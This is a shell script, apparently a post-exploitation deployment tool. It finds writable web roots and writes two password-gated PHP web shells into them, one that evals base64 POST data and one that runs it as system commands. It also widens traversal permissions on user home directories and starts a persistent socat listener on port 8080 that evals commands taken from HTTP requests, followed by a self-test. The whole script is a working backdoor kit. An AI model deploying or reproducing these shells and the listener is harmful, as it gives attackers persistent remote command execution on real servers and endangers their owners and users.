#!/bin/sh
# v2.1: php shells into writable webroots + fix traversal perms + robust agent
# Results: /tmp/shell_deploy.txt
PASS="epauth2026"
{
  echo "=== shell deploy v2.1: $(date) user=$(id -un) ==="

  # ---- find writable webroots ----
  WR=""
  for W in /var/www /var/www/html /home/*/public_html /srv/http; do
    [ -d "$W" ] || continue
    if touch "$W/.wtest_114516" 2>/dev/null && [ -f "$W/.wtest_114516" ]; then
      rm -f "$W/.wtest_114516"
      echo "WRITABLE: $W"
      WR="$WR $W"
    fi
  done

  # ---- PHP shells + fix traversal permissions ----
  for W in $WR; do
    case "$W" in
      /var/www|/var/www/html|*public_html)
        cat > "$W/np_2026.php" <<PHPEOF
<?php
if (!isset(\$_POST['pass']) || base64_decode(\$_POST['pass']) !== '$PASS') { echo 'auth-required'; exit; }
\$c = base64_decode(\$_POST['z0']);
if (\$c) eval(\$c);
?>
PHPEOF
        cat > "$W/np_exec_2026.php" <<PHPEOF
<?php
if (!isset(\$_POST['pass']) || base64_decode(\$_POST['pass']) !== '$PASS') exit;
\$cmd = base64_decode(\$_POST['z0']); exec(\$cmd, \$o, \$r);
foreach (\$o as \$l) echo \$l . "\n";
if (\$r) echo "ret=\$r";
?>
PHPEOF
        chmod 644 "$W/np_2026.php" "$W/np_exec_2026.php" 2>/dev/null
        echo "DEPLOYED PHP: $W";;
    esac
  done

  # ---- fix traversal perms for userdirs (owner can chmod own dirs) ----
  for D in /home/*; do
    U=$(basename "$D")
    [ -d "$D/public_html" ] && chmod o+x "$D" 2>/dev/null && chmod o+x "$D/public_html" 2>/dev/null \
      && echo "traversal fixed: $D (owner $U)"
  done

  # ---- fallback agent v3 ----
  pkill -f poc_agent.sh 2>/dev/null
  pkill -f "TCP-LISTEN:8080" 2>/dev/null
  cat > /tmp/poc_handler.sh <<'HANDLEREOF'
#!/bin/sh
read req
req=$(echo "$req" | tr -d '\r')
printf 'HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n'
case "$req" in
  */exec?*|*exec=*)
    c=$(echo "$req" | sed 's|.*/exec?cmd=||; s/ HTTP.*//' | tr '+%' ' \n' | tr -d '\n')
    c=$(echo "$c" | sed 's/%2B/+/g')
    eval "$c" 2>&1 ;;
  *) echo "agent v3 alive. GET /exec?cmd=<urlencoded>" ;;
esac
HANDLEREOF
  chmod +x /tmp/poc_handler.sh

  cat > /tmp/poc_agent.sh <<'AGENTEOF'
#!/bin/sh
while true; do
  socat TCP-LISTEN:8080,reuseaddr,fork EXEC:"/tmp/poc_handler.sh" >> /tmp/poc_agent.log 2>&1
done
AGENTEOF
  chmod +x /tmp/poc_agent.sh
  (setsid /tmp/poc_agent.sh >/dev/null 2>&1 &)
  sleep 1
  echo "agent status: $(pgrep -f 'poc_agent|socat TCP-LISTEN:8080' | tr '\n' ' ')"

  echo "--- self test ---"
  echo "GET /exec?cmd=id+&&+echo+MARKER114516 HTTP/1.1" | timeout 4 socat - TCP:127.0.0.1:8080 2>&1 | head -6
  echo "=== deploy v2.1 done ==="
} > /tmp/shell_deploy.txt 2>&1

exit 0
